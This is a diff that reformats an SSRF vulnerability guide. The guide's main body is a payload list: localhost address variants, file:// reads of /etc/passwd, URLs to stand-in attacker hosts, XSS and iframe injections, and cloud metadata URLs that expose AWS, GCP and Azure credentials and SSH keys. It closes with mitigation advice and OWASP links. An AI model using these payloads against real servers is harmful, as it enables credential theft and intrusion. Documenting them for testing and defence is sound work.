@@ -1,70 +1,79 @@
-### Detection:
+Detection:
+
 Check out parameters such as /file=, /path=, /src= to see if the application can send request only to whitelisted applications.
 Check out if there is PDF or any other file export tool in place which may be vulnerable to SSRF.
 
-### __Basic localhost Payloads:__
-    http://127.0.0.1:port
-    http://localhost:port
-    https://127.0.0.1:port
-    https://localhost:port
-    http://[::]:port
-    http://0000::1:port
-    http://[0:0:0:0:0:ffff:127.0.0.1]
-    http://0/
-    http://127.1
-    http://127.0.1
+__Basic localhost Payloads:__
 
-### __File path:__
-    /etc/passwd
-    file:///etc/passwd
-    file://path/to/file
-    file://\/\/etc/passwd
+http://127.0.0.1:port
+http://localhost:port
+https://127.0.0.1:port
+https://localhost:port
+http://[::]:port
+http://0000::1:port
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://0/
+http://127.1
+http://127.0.1
+
+__File path:__
+
+/etc/passwd
+file:///etc/passwd
+file://path/to/file
+file://\/\/etc/passwd
     
-### __With other protocols:__
-    sftp://attacker.com:port/
-    dict://attacker:port/
-    tftp://attacker.com:port/
-    ldap://localhost:port/
-    gopher://127.0.0.1:port/
+__With other protocols:__
 
-### __From XSS:__
-    \<img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>\
-    \<link rel=attachment href="file:///etc/passwd">\
+sftp://attacker.com:port/
+dict://attacker:port/
+tftp://attacker.com:port/
+ldap://localhost:port/
+gopher://127.0.0.1:port/
 
-### __With iframe injection:__
-    <?php $file = $_GET['file']; header("location:file://$file");?>
-    \<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>\
+__From XSS:__
 
-### __AWS:__
-    http://instance-data
-    http://169.254.169.254
-    http://169.254.169.254/latest/user-data
-    http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
-    http://169.254.169.254/latest/meta-data/
-    http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
-    http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
-    http://169.254.169.254/latest/meta-data/ami-id
-    http://169.254.169.254/latest/meta-data/reservation-id
-    http://169.254.169.254/latest/meta-data/hostname
-    http://169.254.169.254/latest/meta-data/public-keys/
-    http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
-    http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
-    http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
-    http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
-    http://169.254.169.254/latest/dynamic/instance-identity/document
+\<img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>\
+\<link rel=attachment href="file:///etc/passwd">\
 
-### __Google Cloud:__
-    http://169.254.169.254/computeMetadata/v1/
-    http://metadata.google.internal/computeMetadata/v1/
-    http://metadata/computeMetadata/v1/
-    http://metadata.google.internal/computeMetadata/v1/instance/hostname
-    http://metadata.google.internal/computeMetadata/v1/instance/id
-    http://metadata.google.internal/computeMetadata/v1/project/project-id
+__With iframe injection:__
 
-### Azure:
-    http://169.254.169.254/metadata/v1/maintenance
-    http://169.254.169.254/metadata/instance?api-version=2017-04-02
-    http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+<?php $file = $_GET['file']; header("location:file://$file");?>
+\<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>\
+
+__AWS:__
+
+http://instance-data
+http://169.254.169.254
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+__Google Cloud:__
+
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+
+Azure:
+
+http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
 
 What is its impact?
 
@@ -75,8 +84,8 @@ It is also recommended to restrict using network calls if it’s not required, s
 
 For more information on SSRF, please check following links:
 
-[OWASP: Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
+OWASP: Server Side Request Forgery - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
 
-[OWASP: Cheat Sheet Series Server Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
+OWASP: Cheat Sheet Series Server Side Request Forgery Prevention Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
 
 Thank you.
